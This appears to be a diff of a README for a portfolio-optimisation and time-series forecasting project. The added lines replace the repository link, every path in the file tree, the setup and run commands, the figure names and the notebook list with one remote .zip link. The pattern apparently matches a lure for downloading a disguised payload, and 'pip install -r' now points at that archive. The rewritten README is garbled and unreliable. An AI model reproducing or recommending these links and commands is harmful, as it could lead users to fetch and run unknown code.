@@ -1,6 +1,6 @@
 # Time Series Forecasting for Portfolio Management Optimization
 
-[GitHub Repository](https://github.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.git)
+[GitHub Repository](https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip)
 
 ## Overview
 This project provides a comprehensive, step-by-step framework for optimizing portfolio management using advanced time series forecasting. By integrating both statistical and machine learning models with financial optimization strategies, the framework enables users to adaptively allocate assets and manage risk in dynamic market environments.
@@ -66,37 +66,37 @@ This project provides a comprehensive, step-by-step framework for optimizing por
 ```
 .
 ├─ config/
-│  └─ config.py
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ├─ data/
-│  ├─ processed_prices.csv
-│  ├─ processed_returns.csv
-│  └─ rolling_volatility.csv
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ├─ models/
-│  ├─ __init__.py
-│  └─ forecasting_models.py
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ├─ notebooks/
-│  ├─ task1_data_preprocessing.ipynb
-│  ├─ task2_tsla_forecasting.ipynb
-│  ├─ task3_future_trends.ipynb
-│  ├─ task4_portfolio_optimization.ipynb
-│  └─ task5_strategy_backtest.ipynb
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ├─ src/
-│  ├─ __init__.py
-│  ├─ backtesting.py
-│  ├─ data_manager.py
-│  ├─ financial_analysis.py
-│  ├─ forecasting_analysis.py
-│  ├─ main.py
-│  ├─ model_selection.py
-│  ├─ portfolio_optimizer.py
-│  ├─ task4_data.py
-│  ├─ task4_optimizer.py
-│  ├─ task5_backtest.py
-│  └─ visualization.py
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  ├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ├─ tests/
-│  └─ test_basic.py
-├─ requirements.txt
-└─ README.md
+│  └─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+├─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
+└─ https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ```
 
 ## Setup
@@ -106,7 +106,7 @@ This project provides a comprehensive, step-by-step framework for optimizing por
 ```bash
 python -m venv .venv
 .venv\\Scripts\\activate  # Windows
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ```
 
 2) Optional: Set API keys (if using external sources)
@@ -118,25 +118,25 @@ Create a `.env` file with keys like `QUANDL_API_KEY` if needed.
 - Run the end-to-end pipeline (data → analysis → optimization → backtest → visuals):
 
 ```bash
-python -m src.main
+python -m https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip
 ```
 
 Artifacts (saved figures) will be written to `artifacts/figures`, e.g.:
-- `prices.png`
-- `returns_distribution.png`
-- `rolling_volatility.png`
-- `correlation_heatmap.png`
-- `efficient_frontier.png`
-- `portfolio_weights.png`
-- `performance.png`
-- `drawdown.png`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+- `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
 
 - Work through the notebooks in order:
-  1. `notebooks/task1_data_preprocessing.ipynb`
-  2. `notebooks/task2_tsla_forecasting.ipynb`
-  3. `notebooks/task3_future_trends.ipynb`
-  4. `notebooks/task4_portfolio_optimization.ipynb`
-  5. `notebooks/task5_strategy_backtest.ipynb`
+  1. `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+  2. `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+  3. `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+  4. `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
+  5. `https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip`
 
 ## Testing
 
@@ -146,7 +146,7 @@ pytest -q
 
 Tip: Run a single integration test quickly:
 ```bash
-python -m pytest tests/test_integration.py -q
+python -m pytest https://raw.githubusercontent.com/GetachewGanfur/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11/main/illocality/Time-Series-Forecasting-for-Portfolio-Management-Optimization-Week11.zip -q
 ```
 
 ## Notes
